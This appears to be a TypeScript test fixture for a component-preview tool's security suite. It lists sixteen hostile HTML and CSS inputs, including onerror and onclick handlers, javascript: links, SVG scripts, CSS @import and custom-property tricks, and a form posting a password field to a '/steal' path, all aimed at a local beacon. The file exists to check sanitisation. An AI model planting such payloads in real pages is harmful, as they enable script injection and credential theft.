import type { MatchedStyles } from '../../src/capture/matched-css';
import { buildPreview, type PreviewDoc } from '../../src/previews/build';
import { snap } from './snap';

// Hostile component inputs for the security suite (docs/specs/preview-fidelity.md, Security tests).
// Every case would reach `http://localhost:4499` if anything in it ran or loaded.

export const BEACON = 'http://localhost:4499';

export type Hostile = { name: string; markup: string; rules?: { selector: string; declarations: [string, string][] }[]; vars?: Record<string, string> };

export const hostileCases: Hostile[] = [
  { name: 'inline onclick', markup: `<button data-dse-id="e1" onclick="fetch('${BEACON}/onclick')">Go</button>` },
  { name: 'onerror on img', markup: `<div data-dse-id="e1"><img src="x" onerror="fetch('${BEACON}/onerror')"><img src="${BEACON}/img.png"></div>` },
  { name: 'javascript href', markup: `<a data-dse-id="e1" href="javascript:fetch('${BEACON}/js')">Go</a>` },
  { name: 'srcdoc iframe', markup: `<div data-dse-id="e1"><iframe srcdoc="<script>fetch('${BEACON}/srcdoc')</script>"></iframe></div>` },
  { name: 'svg with script and foreignObject', markup: `<svg data-dse-id="e1" viewBox="0 0 10 10"><script>fetch('${BEACON}/svg')</script><foreignObject><img src="${BEACON}/fo.png"></foreignObject><use href="${BEACON}/sprite.svg#a"></use><animate attributeName="href" to="javascript:alert(1)"/></svg>` },
  { name: 'svg with set', markup: `<svg data-dse-id="e1" viewBox="0 0 10 10"><a href="#x"><set attributeName="href" to="javascript:fetch('${BEACON}/set')" begin="0s"/><circle r="4"/></a></svg>` },
  { name: 'expression in style', markup: `<div data-dse-id="e1" style="width: expression(fetch('${BEACON}/expr')); color: red">x</div>` },
  { name: 'url(javascript:) in css', markup: '<div data-dse-id="e1">x</div>', rules: [{ selector: 'div', declarations: [['background', "url(javascript:fetch('x'))"], ['color', 'blue']] }] },
  { name: '@import in css', markup: `<div data-dse-id="e1" style="@import url(${BEACON}/import.css); color: red">x</div>`, rules: [{ selector: 'div', declarations: [['background-image', `url(${BEACON}/bg.png)`]] }] },
  { name: 'position fixed overlay', markup: '<div data-dse-id="e1" style="position: fixed; inset: 0; z-index: 99999">x</div>', rules: [{ selector: 'div', declarations: [['position', 'fixed'], ['top', '0']] }] },
  { name: 'form with external action', markup: `<form data-dse-id="e1" action="${BEACON}/steal" method="post"><input name="pw" type="password"><button formaction="${BEACON}/fa">Send</button></form>` },
  { name: 'data:text/html src', markup: `<div data-dse-id="e1"><iframe src="data:text/html,<script>fetch('${BEACON}/data')</script>"></iframe><object data="data:text/html,x"></object></div>` },
  { name: 'meta refresh', markup: `<div data-dse-id="e1"><meta http-equiv="refresh" content="0;url=${BEACON}/refresh">x</div>` },
  { name: 'base tag', markup: `<div data-dse-id="e1"><base href="${BEACON}/"><a href="page">x</a></div>` },
  { name: 'custom property exfiltration', markup: '<div data-dse-id="e1">x</div>', rules: [{ selector: 'div', declarations: [['background', 'url(var(--x))'], ['border-image', 'var(--x)']] }], vars: { '--x': `url(${BEACON}/var.png)` } },
  { name: '@font-face off-site', markup: '<div data-dse-id="e1" style="font-family: Evil">x</div>', rules: [{ selector: 'div', declarations: [['src', `url(${BEACON}/f.woff2)`], ['font-family', 'Evil']] }] },
];

export function hostilePreview(h: Hostile, storageBase: string): PreviewDoc {
  const snapshot = snap([{ tag: 'body', box: [0, 0, 400, 300] }, { tag: 'div', parent: 0, box: [0, 0, 200, 100] }]);
  const root = snapshot.elements[1]!;
  const matched: Record<string, MatchedStyles> = {
    e1: { rules: (h.rules ?? []).map((r) => ({ selector: r.selector, matched: [r.selector], origin: 'regular', media: [], supports: [], declarations: r.declarations.map(([name, value]) => ({ name, value, important: false })) })), inline: [], pseudo: [] },
  };
  return buildPreview({ markup: h.markup, vars: h.vars ?? {}, snapshot, root, matched, ground: 'rgb(255, 255, 255)', imageColors: {}, fonts: { googleLinks: [], faces: [], mode: 'none' }, policy: { storageBase } });
}
